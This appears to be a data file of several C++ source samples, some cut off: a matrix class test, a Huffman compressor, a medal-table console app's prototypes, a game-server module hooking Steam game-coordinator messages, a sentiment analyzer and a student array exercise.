    "/////////////////////////////////////////////////////////////////////////////\n// \u041f\u0440\u0438\u043a\u043b\u0430\u0434\u043d\u043e\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435\n// \u041e\u0431\u044f\u0432\u043b\u0435\u043d\u0438\u0435, \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0438 \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0445 \u0442\u0438\u043f\u043e\u0432 \u0434\u0430\u043d\u043d\u044b\u0445. \u041f\u0435\u0440\u0435\u0433\u0440\u0443\u0437\u043a\u0430 \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440\u043e\u0432.\n// \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0448\u0430\u0431\u043b\u043e\u043d\u0430 \u043a\u043b\u0430\u0441\u0441\u0430\n// matrixTest.cpp\n// \n// \u0410\u0445\u043c\u0430\u0440\u043e\u0432 \u0420\u0443\u0441\u043b\u0430\u043d\n// \u0423\u043d\u0438\u0432\u0435\u0440\u0441\u0438\u0442\u0435\u0442 \u0418\u0422\u041c\u041e, B34003\n/////////////////////////////////////////////////////////////////////////////\n#include <iostream>\nusing namespace std;\n\n// \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u044f \u043a\u043b\u0430\u0441\u0441\u0430\n#include \"matrix.h\"\n/////////////////////////////////////////////////////////////////////////////\n// \u043f\u0440\u0438\u043c\u0435\u0440 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u043a\u043b\u0430\u0441\u0441\u0430 Matrix\nint main() {\n\tsetlocale(LC_ALL, \"Russian\");\n\tMatrix<double> m1, m2(4, 3), m2_c(m2), m_u(3, 3);\n\tMatrix<double> m_v(3, 4), m_p(2, 2);\n\n\t// \u0422\u0435\u0441\u0442 \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0432\u044b\u0432\u043e\u0434\u0430 \u0438 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u043e\u0432\n\tcout << \"\u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e m1(1\u04451)\" << endl << m1 << endl;\n\tcout << \"\u041f\u043e\u043b\u043d\u044b\u0439 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 m2(4\u04453)\" << endl << m2 << endl;\n\tcout << \"\u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f m2_c(4\u04453)\" << endl << m2_c << endl;\n\n\t// \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0435\u0434\u0438\u043d\u0438\u0447\u043d\u043e\u0439 \u043c\u0430\u0442\u0440\u0438\u0446\u044b\n\tm_u = m_u.getUnitM(3, 3);\n\tcout << \"\u0415\u0434\u0438\u043d\u0438\u0447\u043d\u0430\u044f \u043c\u0430\u0442\u0440\u0438\u0446\u0430 m_u(3\u04453)\" << endl << m_u << endl;\n\n\t// \u0417\u0430\u0434\u0430\u043d\u0438\u0435 \u0438 \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f\n\tcout << \"\u0417\u0430\u0434\u0430\u0435\u043c \u0435\u0434\u0438\u043d\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0432\u043e\u0439 \u043c\u0430\u0442\u0440\u0438\u0446\u044b \u0447\u0438\u0441\u043b\u043e\u043c 12.5\" << endl;\n\tm1.setValue(0, 0, 12.5);\n\tcout << \"\u0417\u043d\u0430\u0447\u0435\u043d\u0438\u0435 m1(0,0) = \" << m1.getValue(0, 0) << endl;\n\n\t// \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 \u0441\u0442\u0440\u043e\u043a \u0438 \u0441\u0442\u043e\u043b\u0431\u0446\u043e\u0432\n\tcout << endl << \"\u0420\u0430\u0437\u043c\u0435\u0440 \u043c\u0430\u0442\u0440\u0438\u0446\u044b m2: \" << m2.getRows() << \"x\" << m2.getCols() << endl;\n\n\t// \u0421\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u0435 \u0440\u0430\u0437\u043c\u0435\u0440\u043e\u0432 \u043c\u0430\u0442\u0440\u0438\u0446\n\tif (m2.eqSize(m2_c)) {\n\t\tcout << endl << \"m2 \u0438 m2_c \u0440\u0430\u0432\u043d\u044b \u043f\u043e \u0440\u0430\u0437\u043c\u0435\u0440\u0443\" << endl;\n\t}\n\telse {\n\t\tcout << endl << \"m2 \u0438 m2_c \u043d\u0435 \u0440\u0430\u0432\u043d\u044b \u043f\u043e \u0440\u0430\u0437\u043c\u0435\u0440\u0443\" << endl;\n\t}\n\n\t// \u0423\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435 \u0438 \u0443\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435 \u0441 \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u043d\u0438\u0435\u043c \u043d\u0430 \u0447\u0438\u0441\u043b\u043e\n\tcout << endl << \"\u0423\u043c\u043d\u043e\u0436\u0430\u0435\u043c m_u \u043d\u0430 5 \u0441 \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u043d\u0438\u0435\u043c\" << endl;\n\tm_u *= 5.;\n\tcout << m_u << endl;\n\n\tcout << \"\u0423\u043c\u043d\u043e\u0436\u0430\u0435\u043c m_u \u043d\u0430 6 \u0431\u0435\u0437 \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u043d\u0438\u044f\" << endl;\n\tcout << m_u * 6. << endl;\n\n\t// \u0423\u043c\u043d\u043e\u0436\u0435\u043d\u0438\u0435 \u043c\u0430\u0442\u0440\u0438\u0446\n\tfor (int i = 0; i < m_v.getRows(); i++) {\n\t\tfor (int j = 0; j < m_v.getCols(); j++) {\n\t\t\tm_v.setValue(i, j, i * j);\n\t\t}\n\t}\n\tcout << \"\u0423\u043c\u043d\u043e\u0436\u0430\u0435\u043c m_u:\" << endl;\n\tcout << m_u << endl;\n\tcout << \"\u043d\u0430 m_v:\" << endl;\n\tcout << m_v << endl;\n\tcout << \"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442:\" << endl << m_u * m_v << endl;\n\n\tcout << \"\u0423\u043c\u043d\u043e\u0436\u0430\u0435\u043c \u043c\u0430\u0442\u0440\u0438\u0446\u044b \u0441 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u043c\u0438 \u0440\u0430\u0437\u043c\u0435\u0440\u0430\u043c\u0438 m2(4x3) \u0438 m_p(2x2)\" << endl;\n\tm2 * m_p;\n\tcout << endl;\n\n\t// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043f\u043e\u043b\u043d\u043e\u0433\u043e \u0440\u0430\u0432\u0435\u043d\u0441\u0442\u0432\u0430 \u043c\u0430\u0442\u0440\u0438\u0446\n\tcout << \"\u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u0440\u0430\u0432\u043d\u044b \u043b\u0438 m2 \u0438 m2_c\" << endl;\n\tif (m2 == m2_c) {\n\t\tcout << \"m2 = m2_c\" << endl;\n\t}\n\n\tif (m2 != m2_c) {\n\t\tcout << \"m2 != m2_c\" << endl;\n\t}\n\n\tcout << \"\u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u0440\u0430\u0432\u043d\u044b \u043b\u0438 m2 \u0438 m_p\" << endl;\n\tif (m2 == m_p) {\n\t\tcout << \"m2 = m2_c\" << endl;\n\t}\n\n\tif (m2 != m_p) {\n\t\tcout << \"m2 != m2_c\" << endl;\n\t}\n\n\t// \u041a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043c\u0430\u0442\u0440\u0438\u0446\n\tcout << endl << \"\u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043c\u0430\u0442\u0440\u0438\u0446\u0443 m_n(3\u04454) \u0438 \u043a\u043e\u043f\u0438\u0440\u0443\u0435\u043c \u0432 \u043d\u0435\u0435 m_v:\" << endl;\n\tMatrix<double> m_n(3, 4);\n\tm_n = m_v;\n\tcout << m_n << endl;\n\n\tcout << endl << \"\u041f\u044b\u0442\u0430\u0435\u043c\u0441\u044f \u0441\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c m_p(2x2) \u0432 m_n(3x4):\" << endl;\n\tm_n = m_p;\n\tcout << m_n << endl;\n\n\t// \u0418\u043d\u0434\u0435\u043a\u0441\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u0434\u043e\u0441\u0442\u0443\u043f\n\tcout << \"\u0417\u043d\u0430\u0447\u0435\u043d\u0438\u0435 m_n(2, 3) = \" << m_n(2, 3) << endl;\n\n\t// \u0412\u0432\u043e\u0434 \u043c\u0430\u0442\u0440\u0438\u0446\u044b \u0441 \u043a\u043b\u0430\u0432\u0438\u0430\u0442\u0443\u0440\u044b\n\tcout << endl << \"\u0417\u0430\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u043c\u0430\u0442\u0440\u0438\u0446\u0443 2\u04452 \u0441 \u043a\u043b\u0430\u0432\u0438\u0430\u0442\u0443\u0440\u044b\" << endl;\n\tMatrix<double> m_kb(2, 2);\n\tcin >> m_kb;\n\tcout << endl << \"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442:\" << endl << m_kb;\n}\n/////////////////////////////////////////////////////////////////////////////",
    "#include <iostream>\n#include <fstream>\n#include <map>\n#include <queue>\n#include <vector>\n#include <string>\n#include <bitset>\n\nusing namespace std;\n\n// Structure for a Huffman Tree node\nstruct Node {\n    char ch;    \n    int freq;   \n    Node* left;\n    Node* right;\n\n    // Constructor for the node\n    Node(char ch, int freq) : ch(ch), freq(freq), left(nullptr), right(nullptr) {}\n};\n\n\nstruct Compare {\n    bool operator()(Node* left, Node* right) {\n        return left->freq > right->freq;  \n    }\n};\n\n// Function to build the Huffman Tree\nNode* buildHuffmanTree(map<char, int>& freqMap) {\n    priority_queue<Node*, vector<Node*>, Compare> pq;\n\n    for (auto pair : freqMap) {\n        pq.push(new Node(pair.first, pair.second));\n    }\n\n    while (pq.size() != 1) {\n        Node* left = pq.top(); pq.pop();\n        Node* right = pq.top(); pq.pop();\n        Node* node = new Node('\\0', left->freq + right->freq);  \n        node->left = left;\n        node->right = right;\n        pq.push(node);\n    }\n\n    return pq.top();  \n}\n\n// Function to generate Huffman codes from the tree\nvoid generateHuffmanCodes(Node* root, string str, map<char, string>& huffmanCode) {\n    if (!root) return;\n\n    if (!root->left && !root->right) {\n        huffmanCode[root->ch] = str;\n    }\n\n    generateHuffmanCodes(root->left, str + \"0\", huffmanCode);\n    generateHuffmanCodes(root->right, str + \"1\", huffmanCode);\n}\n\n// Function to compress a file using Huffman coding\nvoid compressFile(const string& inputFile, const string& outputFile) {\n    ifstream inFile(inputFile, ios::binary);\n    ofstream outFile(outputFile, ios::binary);\n\n    if (!inFile.is_open()) {\n        cerr << \"Cannot open input file.\\n\";\n        return;\n    }\n\n    // Step 1: Count the frequency of each character in the input file\n    map<char, int> freqMap;\n    char ch;\n    while (inFile.get(ch)) {\n        freqMap[ch]++;\n    }\n    inFile.clear();  \n    inFile.seekg(0); \n\n    // Step 2: Build Huffman Tree from the frequency map\n    Node* root = buildHuffmanTree(freqMap);\n\n    // Step 3: Generate Huffman codes for each character\n    map<char, string> huffmanCode;\n    generateHuffmanCodes(root, \"\", huffmanCode);\n\n    // Step 4: Write the frequency table to the output file (for decompression)\n    for (auto pair : freqMap) {\n        outFile << pair.first << pair.second << ' ';\n    }\n    outFile << '\\n';\n\n    // Step 5: Compress the input file using Huffman codes\n    string encodedStr = \"\";\n    while (inFile.get(ch)) {\n        encodedStr += huffmanCode[ch];\n    }\n\n    \n    bitset<8> bits;\n    for (size_t i = 0; i < encodedStr.size(); i += 8) {\n        bits = bitset<8>(encodedStr.substr(i, 8));\n        outFile.put(static_cast<unsigned char>(bits.to_ulong()));\n    }\n\n    inFile.close();\n    outFile.close();\n}\n\n// Function to decompress a file using Huffman coding\nvoid decompressFile(const string& inputFile, const string& outputFile) {\n    ifstream inFile(inputFile, ios::binary);\n    ofstream outFile(outputFile, ios::binary);\n\n    if (!inFile.is_open()) {\n        cerr << \"Cannot open input file.\\n\";\n        return;\n    }\n\n    // Step 1: Read the frequency table from the compressed file\n    map<char, int> freqMap;\n    char ch;\n    int freq;\n    while (inFile >> ch >> freq) {\n        freqMap[ch] = freq;\n    }\n    inFile.clear();\n    inFile.seekg(1, ios::cur); \n\n    // Step 2: Rebuild the Huffman Tree from the frequency table\n    Node* root = buildHuffmanTree(freqMap);\n\n    // Step 3: Decompress the file using the Huffman tree\n    Node* currentNode = root;\n    char byte;\n    while (inFile.get(byte)) {\n        bitset<8> bits(static_cast<unsigned char>(byte)); \n\n        for (int i = 7; i >= 0; --i) {\n            if (bits[i] == 0) currentNode = currentNode->left;\n            else currentNode = currentNode->right;\n\n       \n            if (!currentNode->left && !currentNode->right) {\n                outFile.put(currentNode->ch);\n                currentNode = root;\n            }\n        }\n    }\n\n    inFile.close();\n    outFile.close();\n}\n\n\nint main() {\n    int choice;\n    string inputFile, outputFile;\n\n   \n    cout << \"1. Compress file\\n2. Decompress file\\nEnter your choice: \";\n    cin >> choice;\n\n    if (choice == 1) {\n       \n        cout << \"Enter input file path: \";\n        cin >> inputFile;\n        cout << \"Enter output file path: \";\n        cin >> outputFile;\n        compressFile(inputFile, outputFile);\n    }\n    else if (choice == 2) {\n        \n        cout << \"Enter compressed file path: \";\n        cin >> inputFile;\n        cout << \"Enter output file path: \";\n        cin >> outputFile;\n        decompressFile(inputFile, outputFile); \n    }\n    else {\n        cout << \"Invalid choice!\";  \n    }\n\n    return 0;\n}\n\n",
    "//\t\tBibliotecas\n#include <iostream>\n#include <windows.h>\n#include <cstdlib>\n#include <string>\n#include <cmath>\n#include <conio.h>\n#include <cctype> // Para toupper()\n#include <limits> // Para numeric_limits\n\n//\t\tEspacio utilizado\nusing namespace std;\n\n/*\nA pesar de que en los prototipos de funciones no es obligatorio nombrar los\npar\u00e1metros, se opta por hacerlo para seguir buenas pr\u00e1cticas de programaci\u00f3n\ny mejorar la claridad y mantenimiento del c\u00f3digo.\n\nComentamos casi todo el codigo para mayor comprension y tratamos de optimizar el uso de caracteres para no imprimir y borrar todo el tiempo\nsino borrando solamente la seccion de pantalla que no se usaba\n*/\n\n//\t\tPrototipo de funciones de gestion de secuencia  - esta seguro va a ser la que este en el codigo final, las otras van a estar en bibliotecas\n\n//\tEjecuta la gestion completa de bienvenida incluyendo la visualizaci\u00f3n, la gesti\u00f3n de la l\u00f3gica y la limpieza.\n//\t(No tiene par\u00e1metros).\nbool\tgestionarSecuenciaBienvenida();\n\n//\tEjecuta la gestion completa del login incluyendo la visualizaci\u00f3n, la gesti\u00f3n de la l\u00f3gica y la limpieza.\n//\t(No tiene par\u00e1metros).\nbool\tgestionarSecuenciaLogin();\n\n//\tEjecuta la gestion completa del login en la seccion del usuario incluyendo la gesti\u00f3n de la l\u00f3gica y la limpieza.\n//\t(int& = numero de usuario a utilizar).\nvoid\tgestionarSecuenciaLoginUsuario(int& idUsuario);\n\n//\tEjecuta la gestion completa del login en la seccion de contrasena incluyendo la visualizaci\u00f3n y la gesti\u00f3n de la l\u00f3gica\n//\t(int = ID de usuario, bool& = referencia para indicar si se debe reingresar el usuario, bool& referencia para indicar si el login fue exitoso).\nvoid\tgestionarSecuenciaLoginContrasena(int idUsuario, bool& reintentar_login_usuario, bool& loginExitoso);\n\n//\tEjecuta la gestion completa del error definitivo por usar todos los intentos al ingresar una contrase\u00f1a en el login y la despedida incluyendo la visualizaci\u00f3n y la limpieza.\n//\t(No tiene par\u00e1metros).\nvoid\tgestionarSecuenciaErrorDefinitivoDespedida();\n\n//\tEjecuta la gestion completa del menu cargar medallas incluyendo la gesti\u00f3n de la l\u00f3gica y la limpieza.\n//\t(No tiene par\u00e1metros).\nvoid\tgestionarSecuenciaMenuCargarMedallas();\n\n//\tEjecuta la gestion completa del menu mostrar medallero incluyendo la gesti\u00f3n de la l\u00f3gica y la limpieza.\n//\t(No tiene par\u00e1metros).\nvoid\tgestionarSecuenciaMenuMostrarMedallero();\n\n//\tEjecuta la gestion completa del menu principal incluyendo la visualizaci\u00f3n, la gesti\u00f3n de la l\u00f3gica y la limpieza.\n//\t(No tiene par\u00e1metros).\nvoid\tgestionarSecuenciaMenuPrincipal();\n\n//\tEjecuta la gestion completa del apartado de funcion en desarollo (siendo esta la pantalla final cuando se elije una opcion en cualquiera de los dos sub menu)\n//\t(No tiene par\u00e1metros).\nvoid\tgestionarSecuenciaFuncionalidadEnDesarrollo();\n\n//\tEjecuta la gestion completa de la salida de la aplicacion incluyendo la visualizaci\u00f3n, la gesti\u00f3n de la l\u00f3gica y la limpieza.\n//\t(No tiene par\u00e1metros).\nbool\tgestionarSecuenciaSalirDeLaApp();\n\n\n//\t\tPrototipo de funciones visuales -> mostrar\n\n//\tMuestra la interfaz completa de bienvenida en la consola.\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazBienvenida();\n\n//\tMuestra la interfaz completa del login en la consola.\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazLogin();\n\n//\tMuestra la interfaz completa del login en fase de contrasena en la consola.\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazLoginContrasena();\n\n//\tMuestra la interfaz del medallero ol\u00edmpico en la consola.\n//\t(int = coordenada incial en X, int = coordenada incial en Y).\nvoid\tmostrarInterfazYProcesarInteraccionMedalleroOlimpico(int xInicio, int yInicio);\n\n//\tMuestra la interzaz de exceso de intentos en ingresar una contrase\u00f1a correcta en la consola.\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazErrorDefinitivo();\n\n//\tMuestra la interfaz principal del menu principal en la consola (titulo y barra de navegacio\u00f3n)\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazMenuPrincipal();\n\n//\tMuestra la interfaz principal de las opciones menu principal en la consola.\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazMenuPrincipalOpciones();\n\n//\tMuestra la interfaz principal del menu principal en la consola (titulo y barra de navegacio\u00f3n)\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazMenuCargarMedallas();\n\n//\tMuestra la interfaz principal de las opciones menu principal en la consola.\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazMenuCargarMedallasOpciones();\n\n//\tMuestra la interfaz principal del menu principal en la consola (titulo y barra de navegacio\u00f3n)\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazMenuMostrarMedallero();\n\n//\tMuestra la interfaz principal de las opciones menu principal en la consola.\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazMenuMostrarMedalleroOpciones();\n\n//\tMuestra la interfaz principal del apartado funcionalidad en desarrollo\n//\t(No tiene par\u00e1metros).\nvoid\tmostrarInterfazFuncionalidadEnDesarrollo();\n\n//\tMuestra la interfaz completa de la salida de la aplicacion en la consola.\n//\t(No tiene par\u00e1metros).",
    "#include \"google/protobuf/json/json.h\"\n#include \"library.hpp\"\n#include \"nlohmann/json_fwd.hpp\"\n#include \"steam.hpp\"\n#include <Windows.h>\n#include <algorithm>\n#include <bit>\n#include <chrono>\n#include <citadel_gcmessages_common.pb.h>\n#include <citadel_gcmessages_server.pb.h>\n#include <cstring>\n#include <filesystem>\n#include <fstream>\n#include <gcsdk_gcmessages.pb.h>\n#include <gcsystemmsgs.pb.h>\n#include <google/protobuf/util/json_util.h>\n#include <limits>\n#include <nlohmann/json.hpp>\n#include <random>\n#include <safetyhook.hpp>\n#include <steammessages.pb.h>\n#include <utility>\n#include <vector>\n\n#ifdef SendMessage\n#undef SendMessage\n#endif\n\n#ifdef min\n#undef min\n#endif\n\n#ifdef max\n#undef max\n#endif\n\ntypedef void (*MsgFn)(const char *fmt, ...);\n\nconst uint32_t k_EMsgProtoBufFlag = 0x80000000;\n\nbool                                              wantsProtobufDebugLog                            = false;\nMsgFn                                             pMsg                                             = nullptr;\nSteamGameServer_GetSteamIDFn                      pSteamGameServer_GetSteamID                      = nullptr;\nSteamClientFn                                     pSteamClient                                     = nullptr;\nSteamGameServer_GetHSteamPipeFn                   pSteamGameServer_GetHSteamPipe                   = nullptr;\nSteamGameServer_GetHSteamUserFn                   pSteamGameServer_GetHSteamUser                   = nullptr;\nSteamAPI_ISteamClient_GetISteamGenericInterfaceFn pSteamAPI_ISteamClient_GetISteamGenericInterface = nullptr;\nSafetyHookInline                                  hook_SteamGameServer_RunCallbacks;\nSafetyHookInline                                  hook_SteamAPI_RegisterCallback;\nSafetyHookInline                                  hook_SteamAPI_UnregisterCallback;\nSafetyHookVmt                                     hook_ISteamGameCoordinator;\nSafetyHookVm                                      hook_ISteamGameCoordinator_SendMessage;\nSafetyHookVm                                      hook_ISteamGameCoordinator_IsMessageAvailable;\nSafetyHookVm                                      hook_ISteamGameCoordinator_RetrieveMessage;\nstruct\n{\n\tCCallbackBase *GCMessageAvailable;\n} steam_callbacks;\nstd::vector<std::pair<uint32_t, std::string>> gc_custom_pending;\nstruct ObjectCache\n{\n\tstatic constexpr int Lobby              = 101;\n\tstatic constexpr int ServerStaticLobby  = 102;\n\tstatic constexpr int ServerDynamicLobby = 106;\n\n\tCSOCitadelLobby              lobby;\n\tCSOCitadelServerStaticLobby  static_lobby;\n\tCSOCitadelServerDynamicLobby dynamic_lobby;\n\n\tbool sent_lobby = false;\n} object_cache;\n\ninline uint64_t GetServerSteamID()\n{\n\tif (pSteamGameServer_GetSteamID)\n\t\treturn pSteamGameServer_GetSteamID();\n\treturn 0;\n}\n\ntemplate<typename T>\ninline T GetRandom(T min, T max)\n{\n\tstatic std::random_device seed;\n\tstatic std::mt19937       gen;\n\n\tstd::uniform_int_distribution<T> dist(min, max);\n\treturn dist(gen);\n}\n\ntemplate<typename... Args>\ninline void Msg(const std::format_string<Args...> fmt, Args &&...args)\n{\n\tconst std::string s = std::vformat(fmt.get(), std::make_format_args(args...));\n\tif (pMsg)\n\t\tpMsg(\"[Server-Match] %s\\n\", s.c_str());\n}\n\ntemplate<typename... Args>\ninline void MsgIf(bool value, const std::format_string<Args...> fmt, Args &&...args)\n{\n\tif (value)\n\t{\n\t\tconst std::string s = std::vformat(fmt.get(), std::make_format_args(args...));\n\t\tif (pMsg)\n\t\t\tpMsg(\"[Server-Match] %s\\n\", s.c_str());\n\t}\n}\n\ntemplate<typename T>\ninline T ForceEndian(T value, std::endian expected)\n{\n\tif (expected == std::endian::native)\n\t\treturn value;\n\treturn std::byteswap(value);\n}\n\ninline std::optional<ECitadelMatchMode> ConvertMatchMode(const std::string &s)\n{\n\t// Try to parse directly\n\tECitadelMatchMode value = k_ECitadelMatchMode_Invalid;\n\tif (ECitadelMatchMode_Parse(s, &value))\n\t\treturn value;\n\n\tstd::string lower(s.size(), '\\0');\n\tstd::transform(s.begin(), s.end(), lower.begin(), [](char c) -> char {\n\t\treturn std::tolower(c);\n\t});\n\n\tif (lower == \"invalid\")\n\t\treturn k_ECitadelMatchMode_Invalid;\n\tif (lower == \"unranked\")\n\t\treturn k_ECitadelMatchMode_Unranked;\n\tif (lower == \"privatelobby\")\n\t\treturn k_ECitadelMatchMode_PrivateLobby;\n\tif (lower == \"coopbot\")\n\t\treturn k_ECitadelMatchMode_CoopBot;\n\tif (lower == \"ranked\")\n\t\treturn k_ECitadelMatchMode_Ranked;\n\tif (lower == \"servertest\")\n\t\treturn k_ECitadelMatchMode_ServerTest;\n\tif (lower == \"tutorial\")\n\t\treturn k_ECitadelMatchMode_Tutorial;\n\treturn std::nullopt;\n}\n\ninline std::optional<ECitadelGameMode> ConvertGameMode(const std::string &s)\n{\n\t// Try to parse directly\n\tECitadelGameMode value = k_ECitadelGameMode_Invalid;\n\tif (ECitadelGameMode_Parse(s, &value))\n\t\treturn value;\n\n\tstd::string lower(s.size(), '\\0');\n\tstd::transform(s.begin(), s.end(), lower.begin(), [](char c) -> char {\n\t\treturn std::tolower(c);\n\t});\n\n\tif (lower == \"invalid\")\n\t\treturn k_ECitadelGameMode_Invalid;\n\tif (lower == \"normal\")\n\t\treturn k_ECitadelGameMode_Normal;\n\tif (lower == \"1v1test\")\n\t\treturn k_ECitadelG",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <unordered_map>\n#include <unordered_set>\n#include <algorithm>\n\nusing namespace std;\n\nclass SentimentAnalyzer {\npublic:\n    // Loading positive words from the uploaded file i.e positive words.txt\n    void loadPositiveWords(const string& filename) {\n        loadWords(filename, positiveWords_, 1); // Set the value for positive words as +1\n    }\n\n    // Loading negative words from the uploaded file i.e negative words.txt\n    void loadNegativeWords(const string& filename) {\n        loadWords(filename, negativeWords_, -1); // Set the value for negative words as -1\n    }\n\n    // In the below code snippet, we analyze the sentiment of user input.\n    int analyzeSentiment(const string& userInput) const {\n        // Extract words from user input\n        unordered_map<string, int> wordScores = extractWordsWithScores(userInput);\n\n        // Count positive and negative words\n        int positiveCount = countMatchingWords(wordScores, positiveWords_);\n        int negativeCount = countMatchingWords(wordScores, negativeWords_);\n\n        // Check for negation and adjust sentiment\n        if (containsNegation(wordScores, userInput)) {\n            swap(positiveCount, negativeCount);\n        }\n\n        // Adjust sentiment score based on overall counts\n        int totalScore = positiveCount - negativeCount;\n\n        return totalScore;\n    }\n\nprivate:\n    // Maps to store positive and negative words with their scores\n    unordered_map<string, int> positiveWords_;\n    unordered_map<string, int> negativeWords_;\n    unordered_set<string> negationWords = {\"not\", \"no\", \"never\", \"nor\", \"neither\", \"nothing\"};\n\n    // Load words from a file into a specified unordered_map with scores\n    void loadWords(const string& filename, unordered_map<string, int>& wordMap, int score) const {\n        ifstream file(filename);\n        if (file.is_open()) {\n            string word;\n            while (file >> word) {\n                // Convert to lowercase before inserting\n                transform(word.begin(), word.end(), word.begin(), ::tolower);\n                wordMap[word] = score;\n            }\n            file.close();\n        } else {\n            // Print an error message if the file is not opening.\n            cerr << \"Error opening file: \" << filename << endl;\n        }\n    }\n\n    // Extract words from a text with their scores, removing punctuation and converting to lowercase\n    unordered_map<string, int> extractWordsWithScores(const string& text) const {\n        unordered_map<string, int> wordScores;\n        istringstream iss(text);\n        string word;\n\n        while (iss >> word) {\n            // Remove punctuations (basic implementation)\n            word.erase(remove_if(word.begin(), word.end(), ::ispunct), word.end());\n\n            // Convert to lowercase before inserting\n            transform(word.begin(), word.end(), word.begin(), ::tolower);\n\n            // Check for negation and adjust the score\n            int score = 1; // Default score for non-negated words\n            if (containsNegation(wordScores, word)) {\n                score = -score; // Negate the score if the word is in a negation context\n            }\n\n            wordScores[word] = score;\n        }\n\n        return wordScores;\n    }\n\n    // Check if the given word is in a negation context\n    bool containsNegation(const unordered_map<string, int>& wordScores, const string& userInput) const {\n        // Check if the user input contains any negation words\n        for (const auto& negationWord : negationWords) {\n            if (userInput.find(negationWord) != string::npos) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    // Count the number of words in a set that match the words in another set\n    int countMatchingWords(const unordered_map<string, int>& wordScores, const unordered_map<string, int>& lexicon) const {\n        int count = 0;\n        for (const auto& pair : wordScores) {\n            if (lexicon.count(pair.first)) {\n                count += pair.second;\n            }\n        }\n        return count;\n    }\n};\n\nint main() {\n    SentimentAnalyzer analyzer;\n\n    // Loading positive and negative words from the uploaded files\n    analyzer.loadPositiveWords(\"positive words.txt\");\n    analyzer.loadNegativeWords(\"negative words.txt\");\n\n    // Take user input as a paragraph\n    cout << \"Enter text for sentiment analysis (press Ctrl+D to end input): \";\n    stringstream inputParagraphStream;\n    string line;\n    while (getline(cin, line)) {\n        inputParagraphStream << line << endl;\n    }\n    string userInput = inputParagraphStream.str();\n\n    // Analyzing sentiment\n    int sentimentScore = analyzer.analyzeSentiment(userInput);\n\n    // Determine sentiment label\n    string sentimentLabel;\n    if (sentimentScore > 0) {\n        sentimentLabel = \"Positive\";\n    } else if (sentimentScore < 0) {\n        sentimentLabel = \"Negative\";\n    } else {\n        senti",
    "//Done by: Kaznienko Viktoria\n//123\n/* Given a set of sequences of values A[m, n] where m is the sequence number and n is the number of elements in the m-th sequence.\nFind the minimum positive value within the set. */\n#include <iostream>\n#include <vector>\n#include <cstdlib>  // For rand() and srand()\n#include <ctime>    // For time()\n\nusing namespace std;\n\nint main() {\n    // Set seed for random number generator\n    srand(time(0));\n\n    // Input the number of sequences\n    int m;\n    cout << \"Enter the number of sequences: \";\n    cin >> m;\n\n    // Vector to store the sequences\n    vector<vector<int>> A(m);\n\n    // Generate random sequences\n    for (int i = 0; i < m; ++i) {\n        int n = rand() % 10 + 1; // Random number of elements between 1 and 10\n        A[i].resize(n);\n\n        cout << \"Sequence \" << i + 1 << \": \";\n        for (int j = 0; j < n; ++j) {\n            // Generate random numbers between -50 and 49\n            A[i][j] = rand() % 100 - 50;\n            cout << A[i][j] << \" \"; 